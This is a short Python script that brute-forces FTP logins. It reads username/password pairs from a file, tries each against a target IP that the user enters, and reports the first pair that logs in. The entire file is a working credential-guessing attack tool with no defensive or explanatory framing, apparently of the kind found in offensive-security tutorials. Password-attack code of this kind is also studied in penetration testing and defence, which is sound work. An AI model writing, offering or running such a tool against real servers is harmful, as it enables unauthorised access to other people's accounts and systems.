#!/usr/bin/python

import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		pF = open(passwdFile, 'r')
	except:
		print("[!!] File Doesn't Exist!")
	for line in pF.readlines():
		user, passwd = line.split(':')
		passwd = passwd.strip('\n')
		print("[+] Trying: " + user + "/" + passwd)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(user, passwd)
			print("[+] Login Succeeded With: " + user + "/" + passwd)
			ftp.quit()
			return(user, passwd)
		except:
			pass
	print("[-] Password Not In List")


host = input("[*] Enter Targets IP Address: ")
passwdFile = input("[*] Enter User/Password File Path: ")
bruteLogin(host, passwdFile)
